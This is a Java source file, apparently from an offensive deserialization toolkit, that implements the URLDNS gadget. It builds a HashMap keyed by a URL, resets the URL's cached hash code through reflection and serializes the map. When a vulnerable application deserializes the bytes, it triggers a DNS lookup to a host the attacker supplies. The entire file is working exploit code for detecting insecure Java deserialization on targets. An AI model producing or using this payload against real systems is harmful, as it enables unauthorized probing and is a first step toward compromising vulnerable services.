package com.droplab.Utils.UnSerialize.Gadget;

import com.droplab.Utils.UnSerialize.Gadget.Interface.GadgetInterface;
import com.droplab.Utils.UnSerialize.utils.Gadgets;
import com.droplab.Utils.UnSerialize.utils.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS implements GadgetInterface {
    @Override
    public byte[] getObject(Object o) {
        try {

            URLStreamHandler handler = new SilentURLStreamHandler();

            HashMap ht = new HashMap(); // HashMap that will contain the URL
            URL u = new URL(null,(String) o, handler); // URL to use as the Key
            ht.put(u, (String) o); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

            Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

            return Gadgets.SerializeObject(ht);
        }catch (Exception e){
            e.printStackTrace();
        }
        return new byte[0];
    }


    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}


